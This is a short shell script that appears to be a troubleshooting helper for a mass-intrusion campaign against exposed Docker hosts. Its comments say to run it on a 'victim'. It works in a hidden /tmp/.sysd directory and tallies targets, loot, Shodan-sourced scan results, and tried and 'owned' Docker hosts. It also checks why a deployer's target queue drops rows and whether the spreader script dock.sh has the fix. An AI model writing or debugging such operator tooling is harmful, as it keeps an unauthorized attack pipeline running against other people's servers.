#!/bin/sh
# Does the deployer actually see the queue? Run here and on a victim.
# The queue is built as targets.txt + loot.txt + mass.found, then filtered with
# a strict IPv4 regex - so a CR at end of line silently deletes the row.
cd "${1:-/tmp/.sysd/.hunt}" || exit 1
echo "mass_lines=$(wc -l < mass.found 2>/dev/null || echo 0)"
echo "mass_docker_rows=$(grep -c 'docker=' mass.found 2>/dev/null || echo 0)"
echo "mass_shodan_rows=$(grep -c 'shodan' mass.found 2>/dev/null || echo 0)"
echo "cr_lines=$(grep -c "$(printf '\r')$" mass.found 2>/dev/null || echo 0)"
echo "survive_regex_raw=$(cut -f1 mass.found 2>/dev/null | grep -cE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$')"
tr -d '\r' < mass.found > /tmp/_mf2 2>/dev/null
echo "survive_regex_cr_stripped=$(cut -f1 /tmp/_mf2 2>/dev/null | grep -cE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$')"
echo "seen=$(wc -l < dock.seen 2>/dev/null || echo 0) tried=$(wc -l < dock.tried 2>/dev/null || echo 0) owned=$(wc -l < dock.owned 2>/dev/null || echo 0)"
echo "swept_24s=$(wc -l < mass.done 2>/dev/null || echo 0)"
echo "targets=$(wc -l < targets.txt 2>/dev/null || echo 0) loot=$(wc -l < loot.txt 2>/dev/null || echo 0)"
echo "dock_sh_has_cr_fix=$(grep -c "tr -d '\\\\r'" "${2:-/tmp/.sysd/dock.sh}" 2>/dev/null || echo 0)"
